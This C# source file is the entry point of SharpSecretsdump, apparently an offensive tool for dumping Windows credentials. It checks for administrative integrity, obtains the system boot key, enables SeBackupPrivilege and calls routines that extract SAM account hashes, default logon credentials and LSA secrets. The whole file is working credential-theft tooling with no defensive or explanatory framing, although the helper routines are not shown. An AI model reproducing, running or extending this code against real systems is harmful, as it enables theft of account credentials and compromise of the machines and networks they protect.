using System;

namespace SharpSecretsdump
{
    class Program
    {
        static void Main(string[] args)
        {
            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("You need to be in high integrity to extract LSA secrets!");
                return;
            }

            byte[] bootkey = null;
            if (args.Length == 1)
            {
                bootkey = Helpers.StringToByteArray(args[0].Replace("0x", ""));
            }
            else
            {
                bootkey = LSADump.GetBootKey();
            }

            Helpers.EnablePrivilege("SeBackupPrivilege");

            Console.WriteLine($"[*] Target system bootKey: 0x{Helpers.Hexlify(bootkey)}");

            Helpers.GetSamAccounts(bootkey);
            Helpers.GetDefaultLogon();
            Helpers.GetLsaSecrets(bootkey);
        }
    }
}
